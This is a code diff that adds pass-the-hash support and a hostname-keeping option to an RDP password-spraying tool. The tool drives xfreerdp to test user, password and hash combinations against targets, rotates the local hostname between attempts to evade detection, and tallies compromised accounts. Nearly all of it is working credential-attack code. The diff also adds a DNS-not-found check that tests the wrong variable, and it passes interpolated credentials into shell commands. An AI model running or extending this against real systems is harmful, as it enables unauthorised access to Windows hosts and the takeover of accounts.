@@ -26,9 +26,9 @@ def args_parse():
     sleep_group = parser.add_mutually_exclusive_group(required=False)
     user_group.add_argument('-U', '--userlist', help="Users list to use, one user per line")
     user_group.add_argument('-u', '--user', help="Single user to use")
-    pass_group.add_argument('-p', '--password', help="Single password to use")
+    pass_group.add_argument('-p', '--password', help="Single password/hash to use")
     pass_group.add_argument('-P', '--passwordlist',
-                            help="Password list to use, one password per line")
+                            help="Password/Hash list to use, one password per line")
     target_group.add_argument('-T', '--targetlist', help="Targets list to use, one target per line")
     target_group.add_argument('-t', '--target', help="Target machine to authenticate against")
     sleep_group.add_argument('-s', '--sleep', type=int,
@@ -42,8 +42,12 @@ def args_parse():
     parser.add_argument('-d', '--domain', help="Domain name to use")
     parser.add_argument('-n', '--names',
                         help="Hostnames list to use as the source hostnames, one per line")
+    parser.add_argument('--keephostname', help="Do not change the hostname between attempts",
+                        action="store_true", default=False)
     parser.add_argument('-o', '--output', help="Output each attempt result to a csv file",
                         default="RDPassSpray")
+    parser.add_argument('--pth', help="Treat passwords as hashes for Pass-The-Hash",
+                        action="store_true", default=False)
 
     parser.add_argument('-V', '--verbose', help="Turn on verbosity to show failed "
                                                 "attempts", action="store_true", default=False)
@@ -143,7 +147,7 @@ def locked_input(question, possible_answer, default_ans, timeout=5):  # asking t
 
 
 def attempts(users, passes, targets, domain, output_file_name, hostnames_stripped, sleep_time,
-             hostname_loop, random, min_sleep, max_sleep, verbose):
+             hostname_loop, random, min_sleep, max_sleep, verbose, pass_the_hash, keep_hostname):
     # xfreerdp response status codes:
     # failed_login = b"ERRCONNECT_LOGON_FAILURE [0x00020014]"
     # access_denied = b"ERRCONNECT_AUTHENTICATION_FAILED [0x00020009]"
@@ -157,6 +161,7 @@ def attempts(users, passes, targets, domain, output_file_name, hostnames_strippe
     account_locked = b"ERRCONNECT_ACCOUNT_LOCKED_OUT"
     account_disabled = b"ERRCONNECT_ACCOUNT_DISABLED [0x00020012]"
     account_expired = b"ERRCONNECT_ACCOUNT_EXPIRED [0x00020019]"
+    dns_name_not_found = b"ERRCONNECT_DNS_NAME_NOT_FOUND"
     success_login_no_rdp = [b'0x0002000D', b'0x00000009']
     failed_to_conn_to_server = [b'0x0002000C', b'0x00020006']
     pass_expired = [b'0x0002000E', b'0x0002000F', b'0x00020013']
@@ -179,18 +184,23 @@ def attempts(users, passes, targets, domain, output_file_name, hostnames_strippe
                 LOGGER.error(
                     "[-] Failed to establish connection, check %s RDP availability." %
                     target)
-                LOGGER.info('[*] Resetting to the original hostname')
-                subprocess.call("hostnamectl set-hostname '%s'" % orighostname, shell=True)
+                if not keep_hostname:
+                    LOGGER.info('[*] Resetting to the original hostname')
+                    subprocess.call("hostnamectl set-hostname '%s'" % orighostname, shell=True)
             else:
                 for password in passes:
                     for username in users:
-                        subprocess.call(
-                            "hostnamectl set-hostname '%s'" % hostnames_stripped[
-                                attempts_hostname_counter],
-                            shell=True)
+                        if not keep_hostname:
+                            subprocess.call(
+                                "hostnamectl set-hostname '%s'" % hostnames_stripped[
+                                    attempts_hostname_counter],
+                                shell=True)
+                        auth_param = "/p:\"%s\"" % (password)
+                        if pass_the_hash:
+                            auth_param = "/p:\"\" /pth:\"%s\"" % (password) # /p is needed for +auth-only, even with /pth
                         spray = subprocess.Popen(
-                            "xfreerdp /v:'%s' +auth-only /d:%s /u:%s /p:'%s' /sec:nla /cert-ignore" %
-                            (target, domain, username, password.replace("'","'\"'\"'")), stdout=subprocess.PIPE,
+                            "xfreerdp /v:'%s' +auth-only /d:%s /u:%s %s /sec:nla /cert-ignore" %
+                            (target, domain, username, auth_param), stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE, shell=True)
                         output_error = spray.stderr.read()
                         output_info = spray.stdout.read()
@@ -212,7 +222,11 @@ def attempts(users, passes, targets, domain, output_file_name, hostnames_strippe
                             status = 'Invalid'
                             if verbose:
                                 output(status, username, password, target, output_file_name)
-                            LOGGER.debug("[-]Creds failed for: " + username)
+                            LOGGER.debug("[-] Creds failed for: " + username)
+                        elif any(word in output_error for word in failed_login):
+                            status = 'DNS name not found'
+                            output(status, username, password, target, output_file_name)
+                            LOGGER.warning("[!]  DNS name not found for: " + target)
                         elif account_locked in output_error:
                             status = 'Locked'
                             output(status, username, password, target, output_file_name)
@@ -282,15 +296,17 @@ def attempts(users, passes, targets, domain, output_file_name, hostnames_strippe
         LOGGER.info("[*] Overall compromised accounts: %s" % working_creds_counter)
         LOGGER.info(
             "[*] Finished running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
-        subprocess.call("hostnamectl set-hostname '%s'" % orighostname, shell=True)
+        if not keep_hostname:
+            subprocess.call("hostnamectl set-hostname '%s'" % orighostname, shell=True)
 
     except Exception as attempt_err:
         exception(attempt_err)
 
     except KeyboardInterrupt:
         LOGGER.critical("[!] [CTRL+C] Stopping the tool")
-        LOGGER.info('[*] Resetting to the original hostname')
-        subprocess.call("hostnamectl set-hostname '%s'" % orighostname, shell=True)
+        if not keep_hostname:
+            LOGGER.info('[*] Resetting to the original hostname')
+            subprocess.call("hostnamectl set-hostname '%s'" % orighostname, shell=True)
         exit(1)
 
 
@@ -299,8 +315,12 @@ def apt_get_xfreerdp():
         ver = subprocess.Popen("xfreerdp /version", stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                shell=True)
         xfreerdp_version_output = ver.stdout.read()
+        xfreerdp_stderr = ver.stderr.read()
         if b'This is FreeRDP ' in xfreerdp_version_output:
             return 0
+        if b'failed to open display' in xfreerdp_version_output:
+            LOGGER.error("[-] Please check that the $DISPLAY environment variable is properly set.")
+            sys.exit(1)
         else:
             LOGGER.error("[-] xfreerdp wasn't identified. please run 'apt-get install xfreerdp'")
             sys.exit(1)
@@ -334,13 +354,13 @@ def logo():
 
 def main():
     logo()
-    random = False
+    random, pass_the_hash = False, False
     min_sleep, max_sleep = 0, 0
     usernames_stripped, passwords_stripped, targets_stripped = [], [], []
     args = args_parse()
+    configure_logger(args.verbose)
     orig_hostname()
     apt_get_xfreerdp()
-    configure_logger(args.verbose)
 
     if args.userlist:
         try:
@@ -390,12 +410,12 @@ def main():
     total_passwords = len(passwords_stripped)
     total_attempts = total_accounts * total_passwords
     LOGGER.info("Total number of users to test: " + str(total_accounts))
-    LOGGER.info("Total number of password to test: " + str(total_passwords))
+    LOGGER.info("Total number of passwords to test: " + str(total_passwords))
     LOGGER.info("Total number of attempts: " + str(total_attempts))
 
     attempts(usernames_stripped, passwords_stripped, targets_stripped, args.domain, args.output,
              hostnames_stripped, args.sleep, hostname_loop, random, min_sleep, max_sleep,
-             args.verbose)
+             args.verbose, args.pth, args.keephostname)
 
 
 if __name__ == '__main__':
